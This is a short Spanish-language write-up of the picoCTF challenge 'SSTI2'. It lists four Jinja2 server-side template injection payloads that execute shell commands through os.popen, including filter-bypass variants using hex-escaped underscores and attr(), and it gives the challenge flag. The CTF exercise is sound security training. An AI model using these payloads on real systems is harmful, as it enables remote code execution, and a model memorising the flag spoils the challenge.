## Descripción 
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:60523/)!

Hint:
1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?
## Solución 1

Ingresamos a la página dada e ingresamos valores y son incorrectos, en la pista nos dice que son las SSTI y las buscamos. Esto significa que servidor no filtra correctamente lo que los usuarios ingresan permitiendo inyectar código, buscamos inyecciones de código que funcionen. A diferencia de SSTI1 no funciona con la misma inyección, vamos probando otros diferentes hasta que demos con el correcto.

```
Inyecciones de código usadas antes de dar con la correcta:
1. {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
2. {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
3. {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
4. {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

flag: picoCTF{sst1_f1lt3r_byp4ss_96a02202}
```

## Referencias
https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/